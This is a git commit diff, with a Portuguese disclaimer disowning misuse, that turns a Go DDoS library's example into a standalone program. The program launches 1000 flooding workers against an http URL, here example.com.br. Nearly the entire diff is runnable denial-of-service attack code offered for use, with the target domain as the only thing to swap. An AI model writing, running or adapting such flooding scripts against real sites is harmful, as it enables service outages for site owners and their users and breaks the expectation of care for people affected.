760b519bdb983e4f25fc072ee73b116983d091a4
Henrique <henrique.rodrigues@sga.pucminas.br>
2024-02-22 11:30:05 -0300

    O dono do repositório não se responssabiliza pelo mau uso dos códigos

--- DDoS/DDoSReal.go
+++ DDoS/DDoSReal.go
@@ -1,13 +1,29 @@
-func ExampleNew() {
+package main
+
+import (
+
+    "fmt"
+//	"net/http"
+	"os"
+//	"strconv"
+//	"testing"
+	"time"
+
+	ddos "github.com/Konstantin8105/DDoS"
+//	freeport "github.com/Konstantin8105/FreePort"
+
+)
+
+func main() {
 	workers := 1000
-	d, err := ddos.New("http://example.com", workers)
+	d, err := ddos.New("http://example.com.br", workers)
 	if err != nil {
 		panic(err)
 	}
 	d.Run()
 	time.Sleep(time.Second)
 	d.Stop()
-	fmt.Fprintf(os.Stdout, "DDoS attack server: http://example.com\n")
+	fmt.Fprintf(os.Stdout, "DDoS attack server: http://example.com.br\n")
 	// Output:
 	// DDoS attack server: http://example.com
 }
